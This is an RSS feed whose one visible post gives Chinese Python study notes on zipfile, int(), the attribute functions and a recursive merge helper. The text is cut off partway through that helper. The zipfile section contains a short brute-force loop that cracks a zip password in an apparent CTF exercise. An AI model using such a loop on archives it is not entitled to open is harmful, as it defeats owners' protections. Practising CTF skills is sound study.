<?xml version="1.0"?>
<rss version="2.0">
    <channel>
        <title>花月書架</title>
        <subtitle></subtitle>
        <icon>https://ly1tnt.github.io/assets/favicon.ico</icon>
        <link>https://ly1tnt.github.io</link>
        <author>
          <name>Linya</name>
        </author>
        <description></description>
        <language>zh-CN</language>
        <pubDate>Mon, 06 Jan 2025 20:18:48 +0800</pubDate>
        <lastBuildDate>Mon, 06 Jan 2025 20:18:48 +0800</lastBuildDate>
        <item>
            <guid isPermalink="true">https://ly1tnt.github.io/2025/01/06/Python/Python/</guid>
            <title>WireShark使用</title>
            <link>https://ly1tnt.github.io/2025/01/06/Python/Python/</link>
            <category term="Python" scheme="https://ly1tnt.github.io/categories/Python/" />
            <pubDate>Mon, 06 Jan 2025 20:18:48 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;python&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#python&#34;&gt;#&lt;/a&gt; Python&lt;/h1&gt;
&lt;h3 id=&#34;1ziperfile模块&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1ziperfile模块&#34;&gt;#&lt;/a&gt; 1.Ziperfile 模块&lt;/h3&gt;
&lt;p&gt;zipfile.ZIP_DEFLATED 压缩减少空间&lt;/p&gt;
&lt;p&gt;zipfile.ZipFile(file[, mode[, compression[, allowZip64]]])&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; zipfile&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# #创建压缩包&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# zf = zipfile.ZipFile(&#34;yasuoceshi.zip&#34;,&#34;w&#34;,zipfile.ZIP_DEFLATED)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;zf &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; zipfile&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ZipFile&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;ceshi111.zip&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;w&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;  zipfile&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ZIP_DEFLATED&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#写入文件，可以一次性将多个文件压缩，打包&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;write&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; filename&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; arcname&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;None&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; compress_type&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;None&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;将指定文件写入ZIP文档中&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#参数 filename: 需要写入文件的路径&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#参数 arcname: 文件写入 ZIP 文档后保存的文件名&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#参数 compress_type: 压缩方法 (ZIP_STORED 或 ZIP_DEFAULED)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;write(路径,别名)&#39;&#39;&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;zf&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;write&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;/bin/bash&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;bash&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;zf&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;write&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;/bin/bunzip2&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;bunzip2&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;zf&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;write&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;/bin/cat&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;tmp/cat&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#关闭文件&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;zf&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;close&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; zipfile&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;zfile&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;zipfile&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ZipFile&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;1.zip&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;r&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;33&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;128&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; j &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;33&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;128&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; k &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;33&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;128&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            mask&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;BaseCTF&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;j&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;k&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;k&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;j&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;FTCesaB&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;try&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                zfile&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;extractall&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;pwd&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;mask&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;encode&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;utf-8&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;mask&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                exit&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;except&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                &lt;span class=&#34;token keyword&#34;&gt;pass&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#BaseCTF_h11h_FTCesaB&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#34;&#34;&#34;extract(文件,路径)&#34;&#34;&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;使用以上的代码，可以实现对密码的爆破。&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;&amp;lt;u&amp;gt; 使用 Ziperfile 模块的时候，出现的问题:&amp;lt;/u&amp;gt;&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;NotImplementedError: That compression method is not supported&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;原因分析：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;当您使用例如 7zip 创建 zip 文件时，此 zip 文件将被加密。&lt;br /&gt;
但是加密不是以字节为单位的，而是在哈希中加密的：AES-256 或 ZipCrypto。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;解决方案:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;导入 pyzipper 模块进行解压&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;extracted_zip&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;extractall&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;pwd&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;encode&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;password&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;2intab&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2intab&#34;&gt;#&lt;/a&gt; 2.int(a,b)&lt;/h3&gt;
&lt;p&gt;将 a 以 b 进制的形式转化为十进制整数。&lt;/p&gt;
&lt;h3 id=&#34;&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#&#34;&gt;#&lt;/a&gt; &lt;/h3&gt;
&lt;h3 id=&#34;3hasattr-函数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3hasattr-函数&#34;&gt;#&lt;/a&gt; 3.hasattr () 函数&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;hasattr()&lt;/strong&gt; 函数用于判断对象是否包含对应的属性&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;hasattr(object, name)
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;object -- 对象。&lt;/li&gt;
&lt;li&gt;name -- 字符串，属性名。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;返回值&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#返回值&#34;&gt;#&lt;/a&gt; 返回值&lt;/h2&gt;
&lt;p&gt;如果对象有该属性返回 True，否则返回 False。&lt;/p&gt;
&lt;h3 id=&#34;4getattr-函数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#4getattr-函数&#34;&gt;#&lt;/a&gt; 4.getattr () 函数&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;getattr(object, name[, default])
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;object -- 对象。&lt;/p&gt;
&lt;p&gt;name -- 字符串，对象属性。&lt;/p&gt;
&lt;p&gt;default -- 默认返回值，如果不提供该参数，在没有对应属性时，将触发 AttributeError。&lt;/p&gt;
&lt;h3 id=&#34;5setattr-函数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#5setattr-函数&#34;&gt;#&lt;/a&gt; 5.setattr () 函数&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;setattr(object, name, value)
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;object -- 对象。&lt;/li&gt;
&lt;li&gt;name -- 字符串，对象属性。&lt;/li&gt;
&lt;li&gt;value -- 属性值。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;6merge函数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#6merge函数&#34;&gt;#&lt;/a&gt; 6.merge 函数&lt;/h3&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;merge&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;src&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; dst&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; k&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; v &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; src&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;items&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;hasattr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;dst&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;__getitem__&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; dst&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;get&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;k&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;v&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;dict&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                merge&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;v&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; dst&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;get&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;k&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                dst&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;k&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; v&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;elif&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;hasattr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;dst&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; k&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;v&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;dict&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token comment&#34;&gt;#如果目标字典不支持索引操作（如是一个对象），但 dst 具有与 k 相同的属性，则检查该属性的值是否为字典。如果是，则递归调用 merge 函数，合并源字典中的值与目标对象中的相应属性。&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            merge&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;v&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;getattr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;dst&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; k&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td 